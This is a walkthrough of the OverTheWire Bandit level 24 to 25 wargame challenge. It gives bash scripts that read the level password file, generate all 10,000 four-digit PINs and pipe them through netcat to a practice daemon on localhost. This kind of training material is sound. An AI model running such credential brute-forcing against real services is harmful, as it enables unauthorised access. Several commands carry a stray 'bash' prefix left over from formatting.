OverTheWire Bandit: Level 24 ‚Üí Level 25
This level involves a brute force attack against a daemon listening on a port. You need to submit the correct 4-digit PIN code along with the bandit24 password.
Initial Reconnaissance
First, let's understand what we're dealing with:
bashnc localhost 30002
You'll see a message asking for the password for bandit24 followed by a 4-digit PIN code, separated by a space.
Understanding the Challenge

A daemon is running on port 30002
You need to send: <bandit24_password> <4-digit-PIN>
The PIN is somewhere between 0000 and 9999
You need to brute force all 10,000 combinations

Solution Strategy
Create a script that generates all possible combinations and tests them against the daemon.
Step-by-Step Solution

Create a working directory:

bashmkdir -p /tmp/mybandit24
cd /tmp/mybandit24

Create a script to generate all PIN combinations:

bashcat > generate_pins.sh << 'EOF'
#!/bin/bash

PASSWORD=$(cat /etc/bandit_pass/bandit24)
OUTPUT_FILE="/tmp/mybandit24/pins.txt"

# Generate all combinations from 0000 to 9999
for i in {0000..9999}
do
    echo "$PASSWORD $i"
done > $OUTPUT_FILE

echo "Generated $(wc -l < $OUTPUT_FILE) combinations"
EOF

Make it executable and run:

bashchmod +x generate_pins.sh
./generate_pins.sh

Test all combinations against the daemon:

bashcat pins.txt | nc localhost 30002 > result.txt

Filter out the wrong attempts to find the password:

bash# Look for the successful attempt
grep -v "Wrong" result.txt | grep -v "Please" | grep -v "^$"
Or more simply:
bashcat result.txt | sort -u | grep -v "Wrong"
Alternative One-Liner Solution
If you want a more compact approach:
bashcd /tmp/mybandit24
for i in {0000..9999}; do echo "$(cat /etc/bandit_pass/bandit24) $i"; done | nc localhost 30002 | grep -v "Wrong"
Optimized Script
Here's a cleaner version:
bash#!/bin/bash

mkdir -p /tmp/mybandit24_bruteforce
cd /tmp/mybandit24_bruteforce

PASSWORD=$(cat /etc/bandit_pass/bandit24)

echo "Generating PIN combinations..."
for i in {0000..9999}; do
    echo "$PASSWORD $i"
done > attempts.txt

echo "Brute forcing... this may take a minute"
cat attempts.txt | nc localhost 30002 > output.txt

echo "Results:"
grep -E "^[^W]" output.txt | grep -v "Please" | tail -n 5
Key Concepts

Brute Force Attack: Systematically trying all possible combinations
Network Communication: Using netcat (nc) to communicate with network services
Bash Loops: Using brace expansion {0000..9999} for iteration
Output Filtering: Using grep to find the successful attempt

Performance Tips

The script may take 30-60 seconds to complete
Generating the file first is faster than piping directly
You can monitor progress with tail -f result.txt in another terminal

Important Notes

Make sure to use your actual bandit24 password (from level 23)
The PIN must be exactly 4 digits (with leading zeros if needed)
There are exactly 10,000 possible combinations (0000-9999)
The daemon will close connection after sending all combinations

Cleanup
bashrm -rf /tmp/mybandit24*
